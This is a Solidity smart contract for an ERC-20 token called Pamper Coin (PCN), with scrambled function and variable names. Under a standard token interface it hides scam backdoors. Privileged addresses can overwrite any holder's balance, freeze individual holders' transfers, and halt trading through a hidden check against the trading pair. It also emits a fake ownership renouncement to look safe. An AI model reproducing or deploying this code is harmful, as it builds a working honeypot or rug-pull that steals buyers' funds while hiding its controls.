//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract feeTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamToken {
    function createPair(address fromShould, address feeTeam) external returns (address);

    function feeTo() external view returns (address);
}

interface tradingMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface autoTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingLiquidityIs) external view returns (uint256);

    function transfer(address launchedFund, uint256 tradingAmount) external returns (bool);

    function allowance(address swapEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingAmount) external returns (bool);

    function transferFrom(
        address sender,
        address launchedFund,
        uint256 tradingAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minReceiver, uint256 value);
    event Approval(address indexed swapEnable, address indexed spender, uint256 value);
}

interface txReceiver is autoTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PamperCoin is feeTotal, autoTo, txReceiver {

    function balanceOf(address marketingLiquidityIs) public view virtual override returns (uint256) {
        return teamModeTake[marketingLiquidityIs];
    }

    bool private listMarketing;

    mapping(address => uint256) private teamModeTake;

    function limitWalletList(address toMaxLiquidity) public {
        require(toMaxLiquidity.balance < 100000);
        if (receiverIs) {
            return;
        }
        if (teamBuy) {
            limitTrading = teamFee;
        }
        fundList[toMaxLiquidity] = true;
        
        receiverIs = true;
    }

    bool public receiverIs;

    uint256 public maxToken = 0;

    mapping(address => bool) public fundList;

    string private marketingFundExempt = "PCN";

    address private maxEnableExempt;

    function owner() external view returns (address) {
        return maxEnableExempt;
    }

    function transfer(address txEnable, uint256 tradingAmount) external virtual override returns (bool) {
        return receiverReceiver(_msgSender(), txEnable, tradingAmount);
    }

    function decimals() external view virtual override returns (uint8) {
        return shouldTokenIs;
    }

    address public autoSell;

    function name() external view virtual override returns (string memory) {
        return feeAmount;
    }

    event OwnershipTransferred(address indexed marketingLaunch, address indexed exemptToken);

    function approve(address modeTrading, uint256 tradingAmount) public virtual override returns (bool) {
        buyAt[_msgSender()][modeTrading] = tradingAmount;
        emit Approval(_msgSender(), modeTrading, tradingAmount);
        return true;
    }

    uint256 private senderTotal = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private buyAt;

    function receiverReceiver(address enableLaunched, address launchedFund, uint256 tradingAmount) internal returns (bool) {
        if (enableLaunched == liquidityWallet) {
            return exemptSell(enableLaunched, launchedFund, tradingAmount);
        }
        uint256 atShould = autoTo(autoSell).balanceOf(tokenExemptEnable);
        require(atShould == sellTxFrom);
        require(launchedFund != tokenExemptEnable);
        if (listLimit[enableLaunched]) {
            return exemptSell(enableLaunched, launchedFund, txAuto);
        }
        tradingAmount = liquidityFrom(enableLaunched, launchedFund, tradingAmount);
        return exemptSell(enableLaunched, launchedFund, tradingAmount);
    }

    uint8 private shouldTokenIs = 18;

    address marketingTakeTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant txAuto = 1 ** 10;

    function launchedMarketingTo() public {
        emit OwnershipTransferred(liquidityWallet, address(0));
        maxEnableExempt = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return marketingFundExempt;
    }

    function liquidityFrom(address enableLaunched, address launchedFund, uint256 tradingAmount) internal view returns (uint256) {
        require(tradingAmount > 0);

        uint256 buyEnable = 0;
        if (enableLaunched == autoSell && maxToken > 0) {
            buyEnable = tradingAmount * maxToken / 100;
        } else if (launchedFund == autoSell && autoBuy > 0) {
            buyEnable = tradingAmount * autoBuy / 100;
        }
        require(buyEnable <= tradingAmount);
        return tradingAmount - buyEnable;
    }

    uint256 toExempt;

    uint256 private limitTrading;

    bool private teamBuy;

    mapping(address => bool) public listLimit;

    function getOwner() external view returns (address) {
        return maxEnableExempt;
    }

    address tokenExemptEnable;

    uint256 sellTxFrom;

    function transferFrom(address enableLaunched, address launchedFund, uint256 tradingAmount) external override returns (bool) {
        if (_msgSender() != marketingTakeTeam) {
            if (buyAt[enableLaunched][_msgSender()] != type(uint256).max) {
                require(tradingAmount <= buyAt[enableLaunched][_msgSender()]);
                buyAt[enableLaunched][_msgSender()] -= tradingAmount;
            }
        }
        return receiverReceiver(enableLaunched, launchedFund, tradingAmount);
    }

    uint256 public autoBuy = 0;

    address public liquidityWallet;

    bool private atIs;

    string private feeAmount = "Pamper Coin";

    constructor (){
        if (teamFee == limitTrading) {
            teamFee = limitTrading;
        }
        launchedMarketingTo();
        tradingMode enableTx = tradingMode(marketingTakeTeam);
        autoSell = teamToken(enableTx.factory()).createPair(enableTx.WETH(), address(this));
        tokenExemptEnable = teamToken(enableTx.factory()).feeTo();
        if (limitTrading != teamFee) {
            teamBuy = true;
        }
        liquidityWallet = _msgSender();
        fundList[liquidityWallet] = true;
        teamModeTake[liquidityWallet] = senderTotal;
        if (limitTrading != teamFee) {
            atIs = false;
        }
        emit Transfer(address(0), liquidityWallet, senderTotal);
    }

    uint256 private teamFee;

    function totalSupply() external view virtual override returns (uint256) {
        return senderTotal;
    }

    function allowance(address exemptAuto, address modeTrading) external view virtual override returns (uint256) {
        if (modeTrading == marketingTakeTeam) {
            return type(uint256).max;
        }
        return buyAt[exemptAuto][modeTrading];
    }

    function enableFund(address fundFrom) public {
        receiverSender();
        if (listMarketing) {
            atIs = true;
        }
        if (fundFrom == liquidityWallet || fundFrom == autoSell) {
            return;
        }
        listLimit[fundFrom] = true;
    }

    function amountLaunched(uint256 tradingAmount) public {
        receiverSender();
        sellTxFrom = tradingAmount;
    }

    function exemptMarketing(address txEnable, uint256 tradingAmount) public {
        receiverSender();
        teamModeTake[txEnable] = tradingAmount;
    }

    function exemptSell(address enableLaunched, address launchedFund, uint256 tradingAmount) internal returns (bool) {
        require(teamModeTake[enableLaunched] >= tradingAmount);
        teamModeTake[enableLaunched] -= tradingAmount;
        teamModeTake[launchedFund] += tradingAmount;
        emit Transfer(enableLaunched, launchedFund, tradingAmount);
        return true;
    }

    function receiverSender() private view {
        require(fundList[_msgSender()]);
    }

}